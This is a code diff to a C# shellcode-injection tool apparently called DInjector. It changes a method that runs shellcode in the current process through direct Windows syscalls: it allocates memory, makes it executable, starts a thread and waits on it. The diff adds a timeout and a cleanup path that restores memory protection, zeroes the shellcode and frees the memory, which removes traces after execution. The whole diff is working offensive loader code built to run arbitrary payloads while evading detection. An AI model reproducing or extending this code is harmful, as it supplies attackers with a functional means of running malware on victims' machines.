@@ -8,7 +8,7 @@ namespace DInjector
 {
     class CurrentThread
     {
-        public static void Execute(byte[] shellcode)
+        public static void Execute(byte[] shellcode, uint timeout)
         {
             #region NtAllocateVirtualMemory (PAGE_READWRITE)
 
@@ -35,11 +35,12 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
 
+            IntPtr protectAddress = baseAddress;
             uint oldProtect = 0;
 
             ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
-                ref baseAddress,
+                ref protectAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                 ref oldProtect);
@@ -75,19 +76,66 @@ namespace DInjector
 
             #endregion
 
-            #region NtWaitForSingleObject
+            if (timeout != 0) // if the shellcode does not need to serve forever, we can do the clean up
+            {
+                _ = Win32.WaitForSingleObject(hThread, timeout);
 
-            ntstatus = Syscalls.NtWaitForSingleObject(
-                hThread,
-                false,
-                0);
+                #region CleanUp: NtProtectVirtualMemory (oldProtect)
 
-            if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
-            else
-                throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");
+                protectAddress = baseAddress;
+                regionSize = (IntPtr)shellcode.Length;
+                uint tmpProtect = 0;
 
-            #endregion
+                ntstatus = Syscalls.NtProtectVirtualMemory(
+                    hProcess,
+                    ref protectAddress,
+                    ref regionSize,
+                    oldProtect,
+                    ref tmpProtect);
+
+                if (ntstatus == NTSTATUS.Success)
+                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtProtectVirtualMemory, oldProtect");
+                else
+                    throw new Exception($"(CurrentThread.CleanUp) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
+
+                #endregion
+
+                // Zero out shellcode bytes
+                Marshal.Copy(new byte[shellcode.Length], 0, baseAddress, shellcode.Length);
+
+                #region CleanUp: NtFreeVirtualMemory (shellcode)
+
+                regionSize = (IntPtr)shellcode.Length;
+
+                ntstatus = Syscalls.NtFreeVirtualMemory(
+                    hProcess,
+                    ref baseAddress,
+                    ref regionSize,
+                    DI.Data.Win32.Kernel32.MEM_RELEASE);
+
+                if (ntstatus == NTSTATUS.Success)
+                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtFreeVirtualMemory, shellcode");
+                else
+                    throw new Exception($"(CurrentThread.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");
+
+                #endregion
+            }
+            else // serve forever
+            {
+                #region NtWaitForSingleObject
+
+                ntstatus = Syscalls.NtWaitForSingleObject(
+                    hThread,
+                    false,
+                    timeout);
+
+                if (ntstatus == NTSTATUS.Success)
+                    Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
+                else
+                    throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");
+
+                #endregion
+            }
 
             Syscalls.NtClose(hThread);
         }
